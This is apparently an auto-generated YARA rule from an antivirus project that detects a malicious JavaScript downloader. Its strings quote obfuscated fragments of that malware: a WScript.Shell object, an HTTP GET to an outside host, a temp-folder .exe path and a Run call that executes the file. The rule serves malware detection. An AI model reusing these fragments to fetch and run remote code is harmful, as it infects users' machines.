rule sig_20160328_5e3eb2954987afeb7224cd8412883bc9 {
  meta:
    description = "datamaliciousorder - file 20160328_5e3eb2954987afeb7224cd8412883bc9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1fa4b3d935f09a248e54a312be0f80670a18058a62b09f5dc5e8ef4bc8b8466f"

  strings:
    $s1  = "function Octhmju() {return Mllvqpx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"K3Ha0CZV.exe\";};" fullword ascii
    $s2  = "Uaqaxjj[Zsgjesztd](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "do {WScript[Umndvy](Xdbawvlj() * 11)} while (Uaqaxjj[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Knrtfa(Gtlnbq, Mtdnrq){return Gtlnbq - Mtdnrq;};" fullword ascii
    $s5  = "var Mllvqpx = function Uocxtm() {return WScript[Cemhba](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bcrebon(Dvkkni){Mllvqpx[\"Run\"](Dvkkni, Quzzupsrvo, Quzzupsrvo);};" fullword ascii
    $s7  = "function Absktigcgj() {return ((Cywudsn == true) && (Cywudsn == Fnaegyd)) ? 1 : Quzzupsrvo;};" fullword ascii
    $s8  = "function Xdbawvlj(){return 22;};" fullword ascii
    $s9  = "return Knrtfa(Fbkdelganh, Rrtnqq);" fullword ascii
    $s10 = "var Cywudsn = false;" fullword ascii
    $s11 = " while (Cinprzdlxn){" fullword ascii
    $s12 = "var Fnaegyd = false;" fullword ascii
    $s13 = "function Lefxtpc(Sqauu) {var Gvrhh = (1, 2, 3, 4, 5, Sqauu); return Gvrhh;};" fullword ascii
    $s14 = "var Lebtq = false;" fullword ascii
    $s15 = "function Trznekeqsx(){return Ahgkqbfy;};" fullword ascii
    $s16 = "function Wqnvhcsrd(){return Cemhba;};" fullword ascii
    $s17 = "function Cvcjizmi()" fullword ascii
    $s18 = "var Njrglpm = new this[\"Date\"]();" fullword ascii
    $s19 = "Cywudsn = true; " fullword ascii
    $s20 = "Fnaegyd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}